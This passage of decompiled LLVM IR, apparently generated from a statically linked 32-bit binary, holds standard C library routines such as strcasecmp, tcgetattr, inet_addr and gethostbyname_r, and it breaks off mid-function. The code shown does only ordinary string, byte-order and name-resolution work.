  %v1_804b671 = inttoptr i32 %v0_804b677 to i8*
  %v2_804b671 = load i8, i8* %v1_804b671, align 1
  %v7_804b671 = icmp eq i8 %v2_804b671, 0
  %v2_804b674 = zext i1 %v7_804b671 to i32
  %v3_804b674 = add i32 %v2_804b674, %v0_804b674
  %v16_804b674 = icmp eq i32 %v3_804b674, 0
  %v1_804b677 = add i32 %v0_804b677, 1
  store i32 %v1_804b677, i32* @esi, align 4
  %v1_804b67a = icmp eq i1 %v16_804b674, false
  br i1 %v1_804b67a, label %dec_label_pc_804b671, label %dec_label_pc_804b67c

dec_label_pc_804b67c:                             ; preds = %dec_label_pc_804b671, %dec_label_pc_804b668
  %v0_804b67e = phi i32 [ ptrtoint ([8 x i8]* @global_var_8051680.332 to i32), %dec_label_pc_804b668 ], [ %v1_804b677, %dec_label_pc_804b671 ]
  store i32 0, i32* @ebp, align 4
  %v1_804b67e = inttoptr i32 %v0_804b67e to i8*
  %v2_804b67e = load i8, i8* %v1_804b67e, align 1
  %v3_804b67e = icmp eq i8 %v2_804b67e, 0
  %v1_804b681 = icmp eq i1 %v3_804b67e, false
  br i1 %v1_804b681, label %dec_label_pc_804b67c.dec_label_pc_804b6b2_crit_edge, label %dec_label_pc_804b683

dec_label_pc_804b67c.dec_label_pc_804b6b2_crit_edge: ; preds = %dec_label_pc_804b67c
  br label %dec_label_pc_804b6b2

dec_label_pc_804b683:                             ; preds = %dec_label_pc_804b67c, %entry
  store i32 22, i32* @ebp, align 4
  %v1_804b68b = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804b697 = bitcast i32* %stack_var_-17 to i8*
  %v7_804b697 = call i32 @_uintmaxtostr(i8* %v6_804b697, i32 %arg1, i32 %v1_804b68b, i32 -10, i32 0)
  %v1_804b69f = add i32 %v7_804b697, -14
  store i32 %v1_804b69f, i32* @esi, align 4
  %v5_804b6a9 = inttoptr i32 %v1_804b69f to i8*
  store i8* %v5_804b6a9, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804b69f to i16*
  %v6_804b6aa = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8051656.333 to i32), i32 14)
  %v0_804b6c1.pre = load i32, i32* @edi, align 4
  %v0_804b6c3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b6b2

dec_label_pc_804b6b2:                             ; preds = %dec_label_pc_804b67c.dec_label_pc_804b6b2_crit_edge, %dec_label_pc_804b683
  %v0_804b6c3 = phi i32 [ %v0_804b67e, %dec_label_pc_804b67c.dec_label_pc_804b6b2_crit_edge ], [ %v0_804b6c3.pre, %dec_label_pc_804b683 ]
  %v0_804b6c1 = phi i32 [ %arg3, %dec_label_pc_804b67c.dec_label_pc_804b6b2_crit_edge ], [ %v0_804b6c1.pre, %dec_label_pc_804b683 ]
  %v4_804b6b4 = icmp eq i32 %arg2, 0
  %v1_804b6b9 = icmp eq i1 %v4_804b6b4, false
  %v2_804b6c1 = select i1 %v1_804b6b9, i32 %v0_804b6c1, i32 0
  store i32 %v2_804b6c1, i32* @edi, align 4
  %v5_804b6c3 = inttoptr i32 %v0_804b6c3 to i8*
  store i8* %v5_804b6c3, i8** %stack_var_-108, align 4
  %v3_804b6c4 = call i32 @strlen(i8* %v5_804b6c3)
  %v1_804b6cc = add i32 %v3_804b6c4, 1
  store i32 %v1_804b6cc, i32* %ebx.global-to-local, align 4
  %v1_804b6cf = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804b6cc, %v1_804b6cf
  br i1 %tmp46, label %dec_label_pc_804b6d3, label %dec_label_pc_804b6da

dec_label_pc_804b6d3:                             ; preds = %dec_label_pc_804b6b2
  store i32 %v1_804b6cf, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804b6da

dec_label_pc_804b6da:                             ; preds = %dec_label_pc_804b6b2, %dec_label_pc_804b6d3
  %v0_804b6df = phi i32 [ %v1_804b6cc, %dec_label_pc_804b6b2 ], [ %v1_804b6cf, %dec_label_pc_804b6d3 ]
  %v1_804b6da = icmp eq i32 %v0_804b6df, 0
  br i1 %v1_804b6da, label %dec_label_pc_804b6f6, label %dec_label_pc_804b6de

dec_label_pc_804b6de:                             ; preds = %dec_label_pc_804b6da
  %v0_804b6e0 = load i32, i32* @esi, align 4
  %v8_804b6e1 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804b6e1, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804b6e5 = call i32 @memcpy(i16* %tmp45, i32 %v0_804b6e0, i32 %v0_804b6df)
  %v1_804b6f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b6f1 = add i32 %arg2, -1
  %v3_804b6f1 = add i32 %v2_804b6f1, %v1_804b6f1
  %v4_804b6f1 = inttoptr i32 %v3_804b6f1 to i8*
  store i8 0, i8* %v4_804b6f1, align 1
  br label %dec_label_pc_804b6f6

dec_label_pc_804b6f6:                             ; preds = %dec_label_pc_804b6da, %dec_label_pc_804b6de
  %v0_804b6f6 = load i32, i32* @ebp, align 4
  %v1_804b6f6 = icmp eq i32 %v0_804b6f6, 0
  br i1 %v1_804b6f6, label %dec_label_pc_804b701, label %dec_label_pc_804b6fa

dec_label_pc_804b6fa:                             ; preds = %dec_label_pc_804b6f6
  %v0_804b6fa = load i8*, i8** %stack_var_-108, align 4
  %v1_804b6fa = ptrtoint i8* %v0_804b6fa to i32
  %v2_804b6fa = call i32 @__errno_location(i32 %v1_804b6fa)
  %v0_804b6ff = load i32, i32* @ebp, align 4
  %v2_804b6ff = inttoptr i32 %v2_804b6fa to i32*
  store i32 %v0_804b6ff, i32* %v2_804b6ff, align 4
  %v0_804b704.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804b701

dec_label_pc_804b701:                             ; preds = %dec_label_pc_804b6f6, %dec_label_pc_804b6fa
  %v0_804b704 = phi i32 [ 0, %dec_label_pc_804b6f6 ], [ %v0_804b704.pre, %dec_label_pc_804b6fa ]
  ret i32 %v0_804b704

; uselistorder directives
  uselistorder i32 %v1_804b6cf, { 1, 2, 0 }
  uselistorder i32 %v1_804b6cc, { 1, 0, 2 }
  uselistorder i32 %v1_804b69f, { 1, 0, 2 }
  uselistorder i32 %v1_804b677, { 0, 2, 1 }
  uselistorder i32 %v3_804b674, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8051680.332 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804b701, { 1, 0 }
  uselistorder label %dec_label_pc_804b6f6, { 1, 0 }
  uselistorder label %dec_label_pc_804b6da, { 1, 0 }
  uselistorder label %dec_label_pc_804b6b2, { 1, 0 }
  uselistorder label %dec_label_pc_804b671, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804b71c = inttoptr i32 %arg2 to i8*
  %v3_804b71c = call i32 @memmove(i8* %v2_804b71c, i32 %arg1)
  ret i32 %v3_804b71c
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804b726 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b726, i32* @ecx, align 4
  %v0_804b730 = load i32, i32* bitcast (i32** @global_var_8054328.334 to i32*), align 8
  br label %dec_label_pc_804b736

dec_label_pc_804b736:                             ; preds = %dec_label_pc_804b753, %entry
  %v0_804b7596 = phi i32 [ %v0_804b7597, %dec_label_pc_804b753 ], [ 0, %entry ]
  %v0_804b753 = phi i32 [ %v1_804b753, %dec_label_pc_804b753 ], [ %arg2, %entry ]
  %v0_804b754 = phi i32 [ %v1_804b754, %dec_label_pc_804b753 ], [ %v4_804b726, %entry ]
  %v12_804b736 = icmp eq i32 %v0_804b754, %v0_804b753
  %.pre = inttoptr i32 %v0_804b754 to i8*
  br i1 %v12_804b736, label %dec_label_pc_804b74e, label %dec_label_pc_804b73a

dec_label_pc_804b73a:                             ; preds = %dec_label_pc_804b736
  %v2_804b73a = load i8, i8* %.pre, align 1
  %v3_804b73a = zext i8 %v2_804b73a to i32
  %v2_804b73d = mul nuw nsw i32 %v3_804b73a, 2
  %v3_804b73d = add i32 %v2_804b73d, %v0_804b730
  %v4_804b73d = inttoptr i32 %v3_804b73d to i16*
  %v5_804b73d = load i16, i16* %v4_804b73d, align 2
  %v6_804b73d = sext i16 %v5_804b73d to i32
  %v1_804b741 = inttoptr i32 %v0_804b753 to i8*
  %v2_804b741 = load i8, i8* %v1_804b741, align 1
  %v3_804b741 = zext i8 %v2_804b741 to i32
  %v2_804b744 = mul nuw nsw i32 %v3_804b741, 2
  %v3_804b744 = add i32 %v2_804b744, %v0_804b730
  %v4_804b744 = inttoptr i32 %v3_804b744 to i16*
  %v5_804b744 = load i16, i16* %v4_804b744, align 2
  %v6_804b744 = sext i16 %v5_804b744 to i32
  %v2_804b748 = sub nsw i32 %v6_804b73d, %v6_804b744
  %v12_804b748 = icmp eq i32 %v2_804b748, 0
  store i32 %v2_804b748, i32* @edx, align 4
  %v1_804b74c = icmp eq i1 %v12_804b748, false
  br i1 %v1_804b74c, label %dec_label_pc_804b757, label %dec_label_pc_804b74e

dec_label_pc_804b74e:                             ; preds = %dec_label_pc_804b736, %dec_label_pc_804b73a
  %v0_804b7597 = phi i32 [ %v2_804b748, %dec_label_pc_804b73a ], [ %v0_804b7596, %dec_label_pc_804b736 ]
  %v2_804b74e = load i8, i8* %.pre, align 1
  %v3_804b74e = icmp eq i8 %v2_804b74e, 0
  br i1 %v3_804b74e, label %dec_label_pc_804b757, label %dec_label_pc_804b753

dec_label_pc_804b753:                             ; preds = %dec_label_pc_804b74e
  %v1_804b753 = add i32 %v0_804b753, 1
  %v1_804b754 = add i32 %v0_804b754, 1
  store i32 %v1_804b754, i32* @ecx, align 4
  br label %dec_label_pc_804b736

dec_label_pc_804b757:                             ; preds = %dec_label_pc_804b74e, %dec_label_pc_804b73a
  %v0_804b759 = phi i32 [ %v0_804b7597, %dec_label_pc_804b74e ], [ %v2_804b748, %dec_label_pc_804b73a ]
  ret i32 %v0_804b759

; uselistorder directives
  uselistorder i32 %v1_804b754, { 1, 0 }
  uselistorder i32 %v0_804b7597, { 1, 0 }
  uselistorder i32 %v2_804b748, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804b754, { 2, 1, 0 }
  uselistorder i32 %v0_804b753, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804b74e, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v3_804b76c = inttoptr i32 %arg1 to i8*
  %v4_804b76c = call i32 @strtok_r(i8* %v3_804b76c, i32 %tmp1, i32 ptrtoint (i32* @global_var_80567c0.335 to i32))
  ret i32 %v4_804b76c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804b784 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804b789 = icmp eq i32 %v3_804b784, 0
  %v1_804b78b = zext i1 %v1_804b789 to i32
  ret i32 %v1_804b78b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b798 = load i32, i32* @esi, align 4
  %v0_804b799 = load i32, i32* @ebx, align 4
  store i32 %v0_804b799, i32* %stack_var_-8, align 4
  %v2_804b79d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804b79d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804b7af = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804b79d)
  store i32 %v3_804b7af, i32* %eax.global-to-local, align 4
  store i32 %v3_804b7af, i32* @esi, align 4
  %v1_804b7b9 = icmp eq i32 %v3_804b7af, 0
  %v1_804b7bb = icmp eq i1 %v1_804b7b9, false
  br i1 %v1_804b7bb, label %dec_label_pc_804b800, label %dec_label_pc_804b7bd

dec_label_pc_804b7bd:                             ; preds = %entry
  %v3_804b7bd = load i32, i32* %stack_var_-44, align 4
  %v1_804b7c1 = load i32, i32* @ebx, align 4
  %v2_804b7c1 = inttoptr i32 %v1_804b7c1 to i32*
  store i32 %v3_804b7bd, i32* %v2_804b7c1, align 4
  %v1_804b7c7 = load i32, i32* @ebx, align 4
  %v2_804b7c7 = add i32 %v1_804b7c7, 4
  %v3_804b7c7 = inttoptr i32 %v2_804b7c7 to i32*
  %v1_804b7ce = load i32, i32* @ebx, align 4
  %v2_804b7ce = add i32 %v1_804b7ce, 8
  %v3_804b7ce = inttoptr i32 %v2_804b7ce to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804b7d5 = load i32, i32* @ebx, align 4
  %v2_804b7d5 = add i32 %v1_804b7d5, 12
  %v3_804b7d5 = inttoptr i32 %v2_804b7d5 to i32*
  store i32 %tmp3, i32* %v3_804b7d5, align 4
  %v4_804b7d8 = zext i8 %tmp to i32
  %v5_804b7d8 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b7d8 = and i32 %v5_804b7d8, -256
  %v7_804b7d8 = or i32 %v6_804b7d8, %v4_804b7d8
  store i32 %v7_804b7d8, i32* %eax.global-to-local, align 4
  %v2_804b7dc = load i32, i32* @ebx, align 4
  %v3_804b7dc = add i32 %v2_804b7dc, 16
  %v4_804b7dc = inttoptr i32 %v3_804b7dc to i8*
  store i8 %tmp, i8* %v4_804b7dc, align 1
  %v0_804b7df = load i32, i32* %eax.global-to-local, align 4
  %v2_804b7e2 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804b7e7 = load i32, i32* @ebx, align 4
  %v1_804b7e7 = add i32 %v0_804b7e7, 17
  store i32 %v1_804b7e7, i32* %eax.global-to-local, align 4
  %v4_804b7eb = call i32 @__GI_mempcpy(i32 %v1_804b7e7, i32 %v2_804b7e2, i32 19, i32 %v0_804b7df)
  store i32 %v4_804b7eb, i32* %eax.global-to-local, align 4
  %v3_804b7f8 = inttoptr i32 %v4_804b7eb to i8*
  %v4_804b7f8 = call i32 @__GI_memset(i8* %v3_804b7f8, i32 0, i32 13)
  store i32 %v4_804b7f8, i32* %eax.global-to-local, align 4
  %v0_804b800.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b800

dec_label_pc_804b800:                             ; preds = %entry, %dec_label_pc_804b7bd
  %v0_804b800 = phi i32 [ %v3_804b7af, %entry ], [ %v0_804b800.pre, %dec_label_pc_804b7bd ]
  store i32 %v0_804b800, i32* %eax.global-to-local, align 4
  %v2_804b805 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b805, i32* @ebx, align 4
  store i32 %v0_804b798, i32* @esi, align 4
  ret i32 %v0_804b800

; uselistorder directives
  uselistorder i32 %v0_804b800, { 1, 0 }
  uselistorder i32 %v3_804b7af, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804b800, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804b80c = trunc i32 %arg1 to i16
  %v2_804b80c = call i16 @llvm.bswap.i16(i16 %v1_804b80c)
  %v3_804b80c = zext i16 %v2_804b80c to i32
  ret i32 %v3_804b80c
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804b818 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804b818
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804b81f = trunc i32 %arg1 to i16
  %v2_804b81f = call i16 @llvm.bswap.i16(i16 %v1_804b81f)
  %v3_804b81f = zext i16 %v2_804b81f to i32
  ret i32 %v3_804b81f
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804b82b = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804b82b
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804b833 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804b83c = inttoptr i32 %arg1 to i8*
  %v3_804b83c = call i32 @inet_aton(i8* %v2_804b83c, i32 %v2_804b833)
  store i32 -1, i32* @edx, align 4
  %v1_804b847 = icmp eq i32 %v3_804b83c, 0
  br i1 %v1_804b847, label %dec_label_pc_804b84f, label %dec_label_pc_804b84b

dec_label_pc_804b84b:                             ; preds = %entry
  %v3_804b84b = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_804b84b, i32* @edx, align 4
  br label %dec_label_pc_804b84f

dec_label_pc_804b84f:                             ; preds = %entry, %dec_label_pc_804b84b
  %v0_804b84f = phi i32 [ -1, %entry ], [ %v3_804b84b, %dec_label_pc_804b84b ]
  ret i32 %v0_804b84f

; uselistorder directives
  uselistorder label %dec_label_pc_804b84f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804b85b = call i32 @__GI___h_errno_location()
  %v0_804b860 = load i32, i32* @edx, align 4
  %v2_804b863 = ptrtoint i32* %stack_var_-4 to i32
  %v9_804b87b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80569ac.337, i32 ptrtoint (i32* @global_var_80567e0.336 to i32), i32 460, i32 %v2_804b863, i32 %v0_804b85b, i32 %v0_804b860, i32 %v0_804b860)
  %v3_804b880 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804b880
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804b888 = load i32, i32* @ebp, align 4
  %v0_804b889 = load i32, i32* @edi, align 4
  %v0_804b88a = load i32, i32* @esi, align 4
  %v0_804b88b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804b89b = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804b89b, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804b8a6 = icmp eq i32 %arg1, 0
  br i1 %v4_804b8a6, label %dec_label_pc_804bbb2, label %dec_label_pc_804b8b1

dec_label_pc_804b8b1:                             ; preds = %entry
  %v1_804b8b1 = call i32 @__errno_location(i32 %v0_804b88b)
  store i32 %v1_804b8b1, i32* %eax.global-to-local, align 4
  store i32 %v1_804b8b1, i32* @esi, align 4
  %v1_804b8b8 = inttoptr i32 %v1_804b8b1 to i32*
  %v2_804b8b8 = load i32, i32* %v1_804b8b8, align 4
  store i32 %v2_804b8b8, i32* @edi, align 4
  store i32 0, i32* %v1_804b8b8, align 4
  %v0_804b8c9 = load i32, i32* @ebx, align 4
  store i32 %v0_804b8c9, i32* %stack_var_-108, align 4
  %v7_804b8d5 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804b8c9, i32 %arg5, i32 %arg6, i32 %v1_804b8b1)
  store i32 %v7_804b8d5, i32* %eax.global-to-local, align 4
  %v1_804b8dd = icmp eq i32 %v7_804b8d5, 0
  br i1 %v1_804b8dd, label %dec_label_pc_804bbb2, label %dec_label_pc_804b8e5

dec_label_pc_804b8e5:                             ; preds = %dec_label_pc_804b8b1
  %v1_804b8e9 = inttoptr i32 %arg6 to i32*
  %v2_804b8e9 = load i32, i32* %v1_804b8e9, align 4
  store i32 %v2_804b8e9, i32* %edx.global-to-local, align 4
  %v9_804b8eb = icmp eq i32 %v2_804b8e9, 1
  br i1 %v9_804b8eb, label %dec_label_pc_804b905, label %dec_label_pc_804b8f0

dec_label_pc_804b8f0:                             ; preds = %dec_label_pc_804b8e5
  %v9_804b8f0 = icmp eq i32 %v2_804b8e9, 4
  br i1 %v9_804b8f0, label %dec_label_pc_804b905, label %dec_label_pc_804b8f5

dec_label_pc_804b8f5:                             ; preds = %dec_label_pc_804b8f0
  %v1_804b8f5 = add i32 %v2_804b8e9, 1
  %v8_804b8f5 = icmp eq i32 %v1_804b8f5, 0
  store i32 %v1_804b8f5, i32* %edx.global-to-local, align 4
  %v1_804b8f6 = icmp eq i1 %v8_804b8f5, false
  br i1 %v1_804b8f6, label %dec_label_pc_804bbb2, label %dec_label_pc_804b8fc

dec_label_pc_804b8fc:                             ; preds = %dec_label_pc_804b8f5
  %v0_804b8fc = load i32, i32* @esi, align 4
  %v1_804b8fc = inttoptr i32 %v0_804b8fc to i32*
  %v2_804b8fc = load i32, i32* %v1_804b8fc, align 4
  %v11_804b8fc = icmp eq i32 %v2_804b8fc, 2
  %v1_804b8ff = icmp eq i1 %v11_804b8fc, false
  br i1 %v1_804b8ff, label %dec_label_pc_804bbb2, label %dec_label_pc_804b905

dec_label_pc_804b905:                             ; preds = %dec_label_pc_804b8fc, %dec_label_pc_804b8f0, %dec_label_pc_804b8e5
  %v0_804b905 = load i32, i32* @ebp, align 4
  store i32 %v0_804b905, i32* %eax.global-to-local, align 4
  %v0_804b907 = load i32, i32* @edi, align 4
  %v1_804b907 = load i32, i32* @esi, align 4
  %v2_804b907 = inttoptr i32 %v1_804b907 to i32*
  store i32 %v0_804b907, i32* %v2_804b907, align 4
  %v0_804b909 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b909 = sub i32 0, %v0_804b909
  %v1_804b90b = urem i32 %v1_804b909, 4
  %v2_804b90b = icmp eq i32 %v1_804b90b, 0
  store i32 %v1_804b90b, i32* %eax.global-to-local, align 4
  %v0_804b920.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804b90b, label %dec_label_pc_804b91c, label %dec_label_pc_804b910

dec_label_pc_804b910:                             ; preds = %dec_label_pc_804b905
  %v2_804b910 = sub i32 %v0_804b920.pre, %v1_804b90b
  %v7_804b910 = icmp ult i32 %v0_804b920.pre, %v1_804b90b
  br i1 %v7_804b910, label %dec_label_pc_804bbad, label %dec_label_pc_804b918

dec_label_pc_804b918:                             ; preds = %dec_label_pc_804b910
  %v0_804b918 = load i32, i32* @ebp, align 4
  %v2_804b918 = add i32 %v0_804b918, %v1_804b90b
  store i32 %v2_804b918, i32* @ebp, align 4
  store i32 %v2_804b910, i32* @ebx, align 4
  br label %dec_label_pc_804b91c

dec_label_pc_804b91c:                             ; preds = %dec_label_pc_804b905, %dec_label_pc_804b918
  %v0_804b920 = phi i32 [ %v2_804b910, %dec_label_pc_804b918 ], [ %v0_804b920.pre, %dec_label_pc_804b905 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804b8e9, align 4
  %tmp43 = icmp ult i32 %v0_804b920, 4
  br i1 %tmp43, label %dec_label_pc_804bbad, label %dec_label_pc_804b92f

dec_label_pc_804b92f:                             ; preds = %dec_label_pc_804b91c
  %v0_804b92f = load i32, i32* @ebx, align 4
  %v1_804b92f = add i32 %v0_804b92f, -4
  store i32 %v1_804b92f, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_804b92f, 8
  br i1 %tmp44, label %dec_label_pc_804bbad, label %dec_label_pc_804b93b

dec_label_pc_804b93b:                             ; preds = %dec_label_pc_804b92f
  %v0_804b93b = load i32, i32* @ebp, align 4
  %v1_804b93b = add i32 %v0_804b93b, 4
  store i32 %v1_804b93b, i32* %edx.global-to-local, align 4
  %v1_804b93e = add i32 %v0_804b92f, -12
  store i32 %v1_804b93e, i32* %eax.global-to-local, align 4
  store i32 %v1_804b93b, i32* %stack_var_-92, align 4
  %v3_804b947 = inttoptr i32 %v1_804b93b to i32*
  store i32 %v0_804b93b, i32* %v3_804b947, align 4
  %v0_804b94a = load i32, i32* %edx.global-to-local, align 4
  %v1_804b94a = add i32 %v0_804b94a, 4
  %v2_804b94a = inttoptr i32 %v1_804b94a to i32*
  store i32 0, i32* %v2_804b94a, align 4
  %tmp45 = icmp ult i32 %v1_804b93e, 32
  br i1 %tmp45, label %dec_label_pc_804bbad, label %dec_label_pc_804b957

dec_label_pc_804b957:                             ; preds = %dec_label_pc_804b93b
  %v0_804b957 = load i32, i32* @ebx, align 4
  %v1_804b957 = add i32 %v0_804b957, -44
  store i32 %v1_804b957, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_804b957, 256
  br i1 %tmp46, label %dec_label_pc_804bbad, label %dec_label_pc_804b96a

dec_label_pc_804b96a:                             ; preds = %dec_label_pc_804b957
  %v0_804b96a = load i32, i32* @ebp, align 4
  %v1_804b96a = add i32 %v0_804b96a, 12
  %v1_804b96d = add i32 %v0_804b96a, 44
  store i32 %v1_804b96d, i32* @edi, align 4
  store i32 %v1_804b96d, i32* %stack_var_-108, align 4
  %v3_804b97e = inttoptr i32 %v1_804b96d to i8*
  %v4_804b97e = call i32 @strncpy(i8* %v3_804b97e, i32 %arg1, i32 %v1_804b957)
  %v0_804b983 = load i32, i32* @edi, align 4
  %v1_804b983 = load i32, i32* @ebp, align 4
  %v2_804b983 = add i32 %v1_804b983, 12
  %v3_804b983 = inttoptr i32 %v2_804b983 to i32*
  store i32 %v0_804b983, i32* %v3_804b983, align 4
  %v1_804b98a = add i32 %v0_804b96a, 16
  %v2_804b98a = inttoptr i32 %v1_804b98a to i32*
  store i32 0, i32* %v2_804b98a, align 4
  %v2_804b991 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804b991, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804b993 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804b998 = inttoptr i32 %arg1 to i8*
  %v3_804b998 = call i32 @inet_aton(i8* %v2_804b998, i32 %v0_804b993)
  store i32 %v3_804b998, i32* %eax.global-to-local, align 4
  %v1_804b9a0 = icmp eq i32 %v3_804b998, 0
  br i1 %v1_804b9a0, label %dec_label_pc_804b9dc, label %dec_label_pc_804b9a4

dec_label_pc_804b9a4:                             ; preds = %dec_label_pc_804b96a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804b9a8 = load i32, i32* @edi, align 4
  store i32 %v0_804b9a8, i32* %arg2, align 4
  %v1_804b9aa = add i32 %tmp18, 8
  %v2_804b9aa = inttoptr i32 %v1_804b9aa to i32*
  store i32 2, i32* %v2_804b9aa, align 4
  %v0_804b9b1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b9b1 = add i32 %v0_804b9b1, 12
  %v2_804b9b1 = inttoptr i32 %v1_804b9b1 to i32*
  store i32 4, i32* %v2_804b9b1, align 4
  %v2_804b9b8 = load i32, i32* %stack_var_-92, align 4
  %v1_804b9bb = load i32, i32* %edx.global-to-local, align 4
  %v2_804b9bb = add i32 %v1_804b9bb, 16
  %v3_804b9bb = inttoptr i32 %v2_804b9bb to i32*
  store i32 %v2_804b9b8, i32* %v3_804b9bb, align 4
  %v1_804b9c2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b9c2 = add i32 %v1_804b9c2, 4
  %v3_804b9c2 = inttoptr i32 %v2_804b9c2 to i32*
  store i32 %v1_804b96a, i32* %v3_804b9c2, align 4
  %v0_804b9c9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804b9c9, i32* %v1_804b89b, align 4
  store i32 0, i32* %v1_804b8e9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bbb2

dec_label_pc_804b9dc:                             ; preds = %dec_label_pc_804b96a
  %v0_804b9dc = call i32 @__open_nameservers()
  store i32 %v0_804b9dc, i32* @eax, align 4
  %v2_804b9ec = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804b9ec, i32* @ebx, align 4
  store i32 %v2_804b9ec, i32* %stack_var_-108, align 4
  %v2_804b9f1 = call i32 @__pthread_return_void(i32 %v2_804b9ec, i32 134534955)
  store i32 %v2_804b9f1, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* %stack_var_-108, align 4
  %v1_804b9fd = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054330.338 to i32))
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* @ecx, align 4
  store i32 134534955, i32* @eax, align 4
  store i32 %v2_804b9ec, i32* %stack_var_-108, align 4
  %v0_804ba07 = load i32, i32* @global_var_8056dd4.339, align 4
  store i32 %v0_804ba07, i32* @esi, align 4
  %v2_804ba0d = call i32 @__pthread_return_void(i32 %v2_804b9ec, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
